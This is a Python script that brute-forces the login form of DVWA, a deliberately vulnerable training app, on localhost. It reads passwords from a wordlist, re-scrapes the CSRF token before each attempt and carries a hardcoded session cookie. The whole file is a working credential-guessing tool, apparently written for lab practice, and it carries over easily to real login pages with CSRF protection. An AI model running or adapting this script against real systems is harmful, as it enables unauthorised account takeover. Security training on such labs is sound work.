#!/usr/bin/python
from sys import argv
import requests
from BeautifulSoup import BeautifulSoup as Soup

_, filename, ko, user = argv
txt = open(filename)

# setup
url = 'http://127.0.0.1/DVWA-master/login.php'
cookie = {'security': 'medium', 'PHPSESSID':'jbahu43mvacg1bg1dte2uhna95'}
s = requests.Session()
target_page = s.get(url, cookies=cookie)

def checkKO(html):
 soup = Soup(html)
 if soup.findAll(text=ko):
  return True
 else:
  return False

page_source = target_page.text
soup = Soup(page_source);
csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')

print('DVWA URL {}').format(url)

with open(filename) as f:
 print('Running brute force attack...')
 for password in f:

  password = password.strip()
  print('[*] Password tryed: {}').format(password)

  payload = {'username': user, 'password': password, 'Login': 'Login', 'user_token': csrf_token}
  r = s.post(url, cookies=cookie, data=payload)
  print('[+] JSON DATA {}'.format(payload))

  if checkKO(r.text):
   soup = Soup(r.text)
   csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
  else:
   print('[!] Password is: {}').format(password)
   exit(0)

print('[-] Brute force failed. No matches found.')
exit(1)
